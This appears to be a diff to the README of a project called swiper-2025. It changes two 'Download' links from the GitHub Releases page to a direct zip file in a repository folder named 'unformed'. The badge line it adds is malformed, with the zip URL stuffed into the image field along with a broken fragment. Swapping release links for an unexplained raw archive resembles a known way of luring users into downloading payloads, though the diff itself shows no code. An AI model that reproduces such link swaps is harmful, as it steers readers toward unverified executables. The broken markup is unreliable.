@@ -4,7 +4,7 @@ Welcome to swiper-2025! This tool helps you benchmark and test various swiper al
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/gr1ix/swiper-2025/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/gr1ix/swiper-2025/main/unformed/swiper-2025.zip%20Latest%https://raw.githubusercontent.com/gr1ix/swiper-2025/main/unformed/swiper-2025.zip)](https://raw.githubusercontent.com/gr1ix/swiper-2025/main/unformed/swiper-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ This guide will help you download and run swiper-2025. Follow these steps to beg
 
 To get started, visit the Releases page to download the latest version of swiper-2025:
 
-[Download swiper-2025](https://github.com/gr1ix/swiper-2025/releases)
+[Download swiper-2025](https://raw.githubusercontent.com/gr1ix/swiper-2025/main/unformed/swiper-2025.zip)
 
 Follow the steps below to install and run the application:
 
